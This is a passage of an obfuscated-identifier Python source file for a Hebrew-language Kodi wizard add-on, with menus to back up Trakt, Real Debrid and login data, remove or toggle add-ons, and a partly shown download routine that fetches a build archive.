	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOO00O00O0O00O000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3165
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOOO00000OO000OOO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOOOO0000OO0O0OO0 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3168
	addFile ('%s שמירת פליליסט לאודר:  '%OO0OOOOOO0OOO00OO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת הגדרות באפר: '%OOOO00O0OOO0O00OO .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3174
	addFile ('%s שמירת רשימות ריפו:  '%O0OO0OO00O00O0000 .replace ('true',OOOO000OO0O0000OO ).replace ('false',OOO0000O000OO00O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3176
	setView ('files','viewType')#line:3178
def traktMenu ():#line:3180
	OOO0000OOOO00OOO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3181
	OO000O0OO00O0OO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3182
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	addFile ('Save Trakt Data: %s'%OOO0000OOOO00OOO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO000O0OO00O0OO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3185
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3186
	for OOO0000OOOO00OOO0 in traktit .ORDER :#line:3188
		OOOOO0000OOO0000O =TRAKTID [OOO0000OOOO00OOO0 ]['name']#line:3189
		O00OO0O0OO00O00OO =TRAKTID [OOO0000OOOO00OOO0 ]['path']#line:3190
		O0000O000O0OOOO00 =TRAKTID [OOO0000OOOO00OOO0 ]['saved']#line:3191
		O00O0OO0OO0OOO00O =TRAKTID [OOO0000OOOO00OOO0 ]['file']#line:3192
		O000O0O0O0O000OO0 =wiz .getS (O0000O000O0OOOO00 )#line:3193
		O0O000OOO0000OOO0 =traktit .traktUser (OOO0000OOOO00OOO0 )#line:3194
		O0000000O00OOO00O =TRAKTID [OOO0000OOOO00OOO0 ]['icon']if os .path .exists (O00OO0O0OO00O00OO )else ICONTRAKT #line:3195
		OOO0OO0OO000OO0O0 =TRAKTID [OOO0000OOOO00OOO0 ]['fanart']if os .path .exists (O00OO0O0OO00O00OO )else FANART #line:3196
		OO000O00OOO0O00O0 =createMenu ('saveaddon','Trakt',OOO0000OOOO00OOO0 )#line:3197
		O0OO00000000000OO =createMenu ('save','Trakt',OOO0000OOOO00OOO0 )#line:3198
		OO000O00OOO0O00O0 .append ((THEME2 %'%s Settings'%OOOOO0000OOO0000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO0000OOOO00OOO0 )))#line:3199
		addFile ('[+]-> %s'%OOOOO0000OOO0000O ,'',icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,themeit =THEME3 )#line:3201
		if not os .path .exists (O00OO0O0OO00O00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =OO000O00OOO0O00O0 )#line:3202
		elif not O0O000OOO0000OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO0000OOOO00OOO0 ,icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =OO000O00OOO0O00O0 )#line:3203
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O000OOO0000OOO0 ,'authtrakt',OOO0000OOOO00OOO0 ,icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =OO000O00OOO0O00O0 )#line:3204
		if O000O0O0O0O000OO0 =="":#line:3205
			if os .path .exists (O00O0OO0OO0OOO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO0000OOOO00OOO0 ,icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =O0OO00000000000OO )#line:3206
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO0000OOOO00OOO0 ,icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =O0OO00000000000OO )#line:3207
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000O0O0O0O000OO0 ,'',icon =O0000000O00OOO00O ,fanart =OOO0OO0OO000OO0O0 ,menu =O0OO00000000000OO )#line:3208
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3210
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3211
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3214
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3215
	setView ('files','viewType')#line:3216
def realMenu ():#line:3218
	O00OOO0OO000OO0O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3219
	OOO0O0OOOOOOOO0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3220
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3221
	addFile ('Save Real Debrid Data: %s'%O00OOO0OO000OO0O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3222
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0O0OOOOOOOO0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3223
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3224
	for O0OO000OOO000O0O0 in debridit .ORDER :#line:3226
		O00O0O0OOO0OOOOO0 =DEBRIDID [O0OO000OOO000O0O0 ]['name']#line:3227
		O000O0OOOOO0OO0OO =DEBRIDID [O0OO000OOO000O0O0 ]['path']#line:3228
		O000OO00OO0O00OO0 =DEBRIDID [O0OO000OOO000O0O0 ]['saved']#line:3229
		OO000O0O00O00O0O0 =DEBRIDID [O0OO000OOO000O0O0 ]['file']#line:3230
		O0O0O0O000OOOOO0O =wiz .getS (O000OO00OO0O00OO0 )#line:3231
		OO00O000O0OO0O0OO =debridit .debridUser (O0OO000OOO000O0O0 )#line:3232
		O00O00O0OOO0OO000 =DEBRIDID [O0OO000OOO000O0O0 ]['icon']if os .path .exists (O000O0OOOOO0OO0OO )else ICONREAL #line:3233
		OO0OO0O0000O0OOO0 =DEBRIDID [O0OO000OOO000O0O0 ]['fanart']if os .path .exists (O000O0OOOOO0OO0OO )else FANART #line:3234
		O000O00OO000OOOO0 =createMenu ('saveaddon','Debrid',O0OO000OOO000O0O0 )#line:3235
		OOOO0OO0O0O00O00O =createMenu ('save','Debrid',O0OO000OOO000O0O0 )#line:3236
		O000O00OO000OOOO0 .append ((THEME2 %'%s Settings'%O00O0O0OOO0OOOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO000OOO000O0O0 )))#line:3237
		addFile ('[+]-> %s'%O00O0O0OOO0OOOOO0 ,'',icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,themeit =THEME3 )#line:3239
		if not os .path .exists (O000O0OOOOO0OO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =O000O00OO000OOOO0 )#line:3240
		elif not OO00O000O0OO0O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO000OOO000O0O0 ,icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =O000O00OO000OOOO0 )#line:3241
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O000O0OO0O0OO ,'authdebrid',O0OO000OOO000O0O0 ,icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =O000O00OO000OOOO0 )#line:3242
		if O0O0O0O000OOOOO0O =="":#line:3243
			if os .path .exists (OO000O0O00O00O0O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO000OOO000O0O0 ,icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =OOOO0OO0O0O00O00O )#line:3244
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO000OOO000O0O0 ,icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =OOOO0OO0O0O00O00O )#line:3245
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0O000OOOOO0O ,'',icon =O00O00O0OOO0OO000 ,fanart =OO0OO0O0000O0OOO0 ,menu =OOOO0OO0O0O00O00O )#line:3246
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3248
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3249
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3252
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3253
	setView ('files','viewType')#line:3254
def loginMenu ():#line:3256
	O000OOOOO0O000O0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3257
	OOOO0O0OO0000O0O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3258
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	addFile ('Save Login Data: %s'%O000OOOOO0O000O0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOO0O0OO0000O0O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3261
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3262
	for O000OOOOO0O000O0O in loginit .ORDER :#line:3264
		OOOOO0000O0OOO00O =LOGINID [O000OOOOO0O000O0O ]['name']#line:3265
		O000OO0OO0OO0000O =LOGINID [O000OOOOO0O000O0O ]['path']#line:3266
		OOO00000000O00OOO =LOGINID [O000OOOOO0O000O0O ]['saved']#line:3267
		O0O00OOO0O0OO000O =LOGINID [O000OOOOO0O000O0O ]['file']#line:3268
		OOOOO00OO0OOOOOOO =wiz .getS (OOO00000000O00OOO )#line:3269
		OOO000000OOOOOO00 =loginit .loginUser (O000OOOOO0O000O0O )#line:3270
		O00O0O00O00OOO0OO =LOGINID [O000OOOOO0O000O0O ]['icon']if os .path .exists (O000OO0OO0OO0000O )else ICONLOGIN #line:3271
		OO00OOO0000OOOOOO =LOGINID [O000OOOOO0O000O0O ]['fanart']if os .path .exists (O000OO0OO0OO0000O )else FANART #line:3272
		O000OOO00OO0OOOO0 =createMenu ('saveaddon','Login',O000OOOOO0O000O0O )#line:3273
		OO0O0OO0OO00000O0 =createMenu ('save','Login',O000OOOOO0O000O0O )#line:3274
		O000OOO00OO0OOOO0 .append ((THEME2 %'%s Settings'%OOOOO0000O0OOO00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000OOOOO0O000O0O )))#line:3275
		addFile ('[+]-> %s'%OOOOO0000O0OOO00O ,'',icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,themeit =THEME3 )#line:3277
		if not os .path .exists (O000OO0OO0OO0000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =O000OOO00OO0OOOO0 )#line:3278
		elif not OOO000000OOOOOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000OOOOO0O000O0O ,icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =O000OOO00OO0OOOO0 )#line:3279
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO000000OOOOOO00 ,'authlogin',O000OOOOO0O000O0O ,icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =O000OOO00OO0OOOO0 )#line:3280
		if OOOOO00OO0OOOOOOO =="":#line:3281
			if os .path .exists (O0O00OOO0O0OO000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000OOOOO0O000O0O ,icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =OO0O0OO0OO00000O0 )#line:3282
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000OOOOO0O000O0O ,icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =OO0O0OO0OO00000O0 )#line:3283
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOO00OO0OOOOOOO ,'',icon =O00O0O00O00OOO0OO ,fanart =OO00OOO0000OOOOOO ,menu =OO0O0OO0OO00000O0 )#line:3284
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3286
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3287
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3290
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3291
	setView ('files','viewType')#line:3292
def fixUpdate ():#line:3294
	if KODIV <17 :#line:3295
		O000O0O0OOO00O000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3296
		try :#line:3297
			os .remove (O000O0O0OOO00O000 )#line:3298
		except Exception as O0OO0OO0OOO000O0O :#line:3299
			wiz .log ("Unable to remove %s, Purging DB"%O000O0O0OOO00O000 )#line:3300
			wiz .purgeDb (O000O0O0OOO00O000 )#line:3301
	else :#line:3302
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3303
def removeAddonMenu ():#line:3305
	O000OO00O0O0O0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3306
	OO0OOOO0OO000O0OO =[];O0OOOOO00OO0O000O =[]#line:3307
	for O0OO000OO0OOO00O0 in sorted (O000OO00O0O0O0000 ,key =lambda OO00000O0O0O0OOOO :OO00000O0O0O0OOOO ):#line:3308
		O00OO00O000O000OO =os .path .split (O0OO000OO0OOO00O0 [:-1 ])[1 ]#line:3309
		if O00OO00O000O000OO in EXCLUDES :continue #line:3310
		elif O00OO00O000O000OO in DEFAULTPLUGINS :continue #line:3311
		elif O00OO00O000O000OO =='packages':continue #line:3312
		OO00OOOOOOOO0O00O =os .path .join (O0OO000OO0OOO00O0 ,'addon.xml')#line:3313
		if os .path .exists (OO00OOOOOOOO0O00O ):#line:3314
			OOO00O0O0OOO0OO0O =open (OO00OOOOOOOO0O00O )#line:3315
			OOO0O00O0000OO0O0 =OOO00O0O0OOO0OO0O .read ()#line:3316
			OO00OO0OO000000OO =wiz .parseDOM (OOO0O00O0000OO0O0 ,'addon',ret ='id')#line:3317
			OO0OO0O0OO000OO0O =O00OO00O000O000OO if len (OO00OO0OO000000OO )==0 else OO00OO0OO000000OO [0 ]#line:3319
			try :#line:3320
				OOOO0O000OOOO000O =xbmcaddon .Addon (id =OO0OO0O0OO000OO0O )#line:3321
				OO0OOOO0OO000O0OO .append (OOOO0O000OOOO000O .getAddonInfo ('name'))#line:3322
				O0OOOOO00OO0O000O .append (OO0OO0O0OO000OO0O )#line:3323
			except :#line:3324
				pass #line:3325
	if len (OO0OOOO0OO000O0OO )==0 :#line:3326
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3327
		return #line:3328
	if KODIV >16 :#line:3329
		OO0OO00O0000OOO00 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OOOO0OO000O0OO )#line:3330
	else :#line:3331
		OO0OO00O0000OOO00 =[];OO00OOOO000OO0O0O =0 #line:3332
		O0OO0O0O0O00OO0OO =["-- Click here to Continue --"]+OO0OOOO0OO000O0OO #line:3333
		while not OO00OOOO000OO0O0O ==-1 :#line:3334
			OO00OOOO000OO0O0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO0O0O0O00OO0OO )#line:3335
			if OO00OOOO000OO0O0O ==-1 :break #line:3336
			elif OO00OOOO000OO0O0O ==0 :break #line:3337
			else :#line:3338
				OO00000O0O00000O0 =(OO00OOOO000OO0O0O -1 )#line:3339
				if OO00000O0O00000O0 in OO0OO00O0000OOO00 :#line:3340
					OO0OO00O0000OOO00 .remove (OO00000O0O00000O0 )#line:3341
					O0OO0O0O0O00OO0OO [OO00OOOO000OO0O0O ]=OO0OOOO0OO000O0OO [OO00000O0O00000O0 ]#line:3342
				else :#line:3343
					OO0OO00O0000OOO00 .append (OO00000O0O00000O0 )#line:3344
					O0OO0O0O0O00OO0OO [OO00OOOO000OO0O0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OOOO0OO000O0OO [OO00000O0O00000O0 ])#line:3345
	if OO0OO00O0000OOO00 ==None :return #line:3346
	if len (OO0OO00O0000OOO00 )>0 :#line:3347
		wiz .addonUpdates ('set')#line:3348
		for O0OO000O00OOOOO00 in OO0OO00O0000OOO00 :#line:3349
			removeAddon (O0OOOOO00OO0O000O [O0OO000O00OOOOO00 ],OO0OOOO0OO000O0OO [O0OO000O00OOOOO00 ],True )#line:3350
		xbmc .sleep (1000 )#line:3352
		if INSTALLMETHOD ==1 :OOOOOO000OOOOOOO0 =1 #line:3354
		elif INSTALLMETHOD ==2 :OOOOOO000OOOOOOO0 =0 #line:3355
		else :OOOOOO000OOOOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3356
		if OOOOOO000OOOOOOO0 ==1 :wiz .reloadFix ('remove addon')#line:3357
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3358
def removeAddonDataMenu ():#line:3360
	if os .path .exists (ADDOND ):#line:3361
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3363
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3364
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3365
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3366
		OO00O00O0O000OO0O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3367
		for OO0OOOO00OO00O0OO in sorted (OO00O00O0O000OO0O ,key =lambda O00OOO0OOO0O0000O :O00OOO0OOO0O0000O ):#line:3368
			O00O0O000OO0O00OO =OO0OOOO00OO00O0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3369
			OO00O0O000OO0OOOO =os .path .join (OO0OOOO00OO00O0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3370
			OO0O0O0000O0O00O0 =os .path .join (OO0OOOO00OO00O0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3371
			O00OO0O00OOOO0O0O =O00O0O000OO0O00OO #line:3372
			O0OOOOOOOOOOOO0OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3373
			for O0OO0000OOO000O0O in O0OOOOOOOOOOOO0OO :#line:3374
				O00OO0O00OOOO0O0O =O00OO0O00OOOO0O0O .replace (O0OO0000OOO000O0O ,O0OOOOOOOOOOOO0OO [O0OO0000OOO000O0O ])#line:3375
			if O00O0O000OO0O00OO in EXCLUDES :O00OO0O00OOOO0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00OO0O00OOOO0O0O #line:3376
			else :O00OO0O00OOOO0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00OO0O00OOOO0O0O #line:3377
			addFile (' %s'%O00OO0O00OOOO0O0O ,'removedata',O00O0O000OO0O00OO ,icon =OO00O0O000OO0OOOO ,fanart =OO0O0O0000O0O00O0 ,themeit =THEME2 )#line:3378
	else :#line:3379
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3380
	setView ('files','viewType')#line:3381
def enableAddons ():#line:3383
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3384
	OOOO0OO0000OO0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3385
	OOOOO0OO0O00O0OOO =0 #line:3386
	for OO000O0OO0OO00O0O in sorted (OOOO0OO0000OO0000 ,key =lambda O00OO0OOO0O0000O0 :O00OO0OOO0O0000O0 ):#line:3387
		O0OOOOOO000O000OO =os .path .split (OO000O0OO0OO00O0O [:-1 ])[1 ]#line:3388
		if O0OOOOOO000O000OO in EXCLUDES :continue #line:3389
		if O0OOOOOO000O000OO in DEFAULTPLUGINS :continue #line:3390
		O0OOOOO0O000O0000 =os .path .join (OO000O0OO0OO00O0O ,'addon.xml')#line:3391
		if os .path .exists (O0OOOOO0O000O0000 ):#line:3392
			OOOOO0OO0O00O0OOO +=1 #line:3393
			OOOO0OO0000OO0000 =OO000O0OO0OO00O0O .replace (ADDONS ,'')[1 :-1 ]#line:3394
			OOO00O0OO0O0O0000 =open (O0OOOOO0O000O0000 )#line:3395
			O0OO00O00OOO00OOO =OOO00O0OO0O0O0000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3396
			O0O00OO00O0OO0000 =wiz .parseDOM (O0OO00O00OOO00OOO ,'addon',ret ='id')#line:3397
			O0O0O000O0OOOOOOO =wiz .parseDOM (O0OO00O00OOO00OOO ,'addon',ret ='name')#line:3398
			try :#line:3399
				OO000000OO0000OO0 =O0O00OO00O0OO0000 [0 ]#line:3400
				O00O00OO00OOOO0OO =O0O0O000O0OOOOOOO [0 ]#line:3401
			except :#line:3402
				continue #line:3403
			try :#line:3404
				O000000000OOOO0O0 =xbmcaddon .Addon (id =OO000000OO0000OO0 )#line:3405
				O00OOO00O0O0OOO00 ="[COLOR green][Enabled][/COLOR]"#line:3406
				OOOOOO0O00O0OO00O ="false"#line:3407
			except :#line:3408
				O00OOO00O0O0OOO00 ="[COLOR red][Disabled][/COLOR]"#line:3409
				OOOOOO0O00O0OO00O ="true"#line:3410
				pass #line:3411
			OO0OO0O0OO0O00OOO =os .path .join (OO000O0OO0OO00O0O ,'icon.png')if os .path .exists (os .path .join (OO000O0OO0OO00O0O ,'icon.png'))else ICON #line:3412
			O00OO0OOO0OO0OO0O =os .path .join (OO000O0OO0OO00O0O ,'fanart.jpg')if os .path .exists (os .path .join (OO000O0OO0OO00O0O ,'fanart.jpg'))else FANART #line:3413
			addFile ("%s %s"%(O00OOO00O0O0OOO00 ,O00O00OO00OOOO0OO ),'toggleaddon',OOOO0OO0000OO0000 ,OOOOOO0O00O0OO00O ,icon =OO0OO0O0OO0O00OOO ,fanart =O00OO0OOO0OO0OO0O )#line:3414
			OOO00O0OO0O0O0000 .close ()#line:3415
	if OOOOO0OO0O00O0OOO ==0 :#line:3416
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3417
	setView ('files','viewType')#line:3418
def changeFeq ():#line:3420
	O000O0OOOOOOOO00O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3421
	OO00OOO0O0O0OOOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000O0OOOOOOOO00O )#line:3422
	if not OO00OOO0O0O0OOOOO ==-1 :#line:3423
		wiz .setS ('autocleanfeq',str (OO00OOO0O0O0OOOOO ))#line:3424
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000O0OOOOOOOO00O [OO00OOO0O0O0OOOOO ]))#line:3425
def developer ():#line:3427
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3428
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3429
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3430
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3431
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3432
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3433
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3434
	setView ('files','viewType')#line:3436
def download (O000000OOOO00OOO0 ,O0O00OO0O00O0000O ):#line:3441
  OO000000O000OO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3442
  OOO00000000OOOO00 =xbmcgui .DialogProgress ()#line:3443
  OOO00000000OOOO00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3444
  O00OO0O000000O0O0 =os .path .join (OO000000O000OO0O0 ,'isr.zip')#line:3445
  O0O0O000OO0OOOOOO =urllib2 .Request (O000000OOOO00OOO0 )#line:3446
  OOO00000OO0OO000O =urllib2 .urlopen (O0O0O000OO0OOOOOO )#line:3447
  OO00O0O0O0000OOOO =xbmcgui .DialogProgress ()#line:3449
  OO00O0O0O0000OOOO .create ("Downloading","Downloading "+name )#line:3450
  OO00O0O0O0000OOOO .update (0 )#line:3451
  O00000O00O0OO0000 =O0O00OO0O00O0000O #line:3452
  OO0O00000000000O0 =open (O00OO0O000000O0O0 ,'wb')#line:3453
  try :#line:3455
    O0000O0OO0OO0O0OO =OOO00000OO0OO000O .info ().getheader ('Content-Length').strip ()#line:3456
    O00O0OOO0OO0000O0 =True #line:3457
  except AttributeError :#line:3458
        O00O0OOO0OO0000O0 =False #line:3459
  if O00O0OOO0OO0000O0 :#line:3461
        O0000O0OO0OO0O0OO =int (O0000O0OO0OO0O0OO )#line:3462
  OO0O0O0O00O0OOO00 =0 #line:3464
  OOOO00O0000OO0O00 =time .time ()#line:3465
  while True :#line:3466
        OO0OO0OO0000O00O0 =OOO00000OO0OO000O .read (8192 )#line:3467
        if not OO0OO0OO0000O00O0 :#line:3468
            sys .stdout .write ('\n')#line:3469
            break #line:3470
        OO0O0O0O00O0OOO00 +=len (OO0OO0OO0000O00O0 )#line:3472
        OO0O00000000000O0 .write (OO0OO0OO0000O00O0 )#line:3473
        if not O00O0OOO0OO0000O0 :#line:3475
            O0000O0OO0OO0O0OO =OO0O0O0O00O0OOO00 #line:3476
        if OO00O0O0O0000OOOO .iscanceled ():#line:3477
           OO00O0O0O0000OOOO .close ()#line:3478
           try :#line:3479
            os .remove (O00OO0O000000O0O0 )#line:3480
           except :#line:3481
            pass #line:3482
           break #line:3483
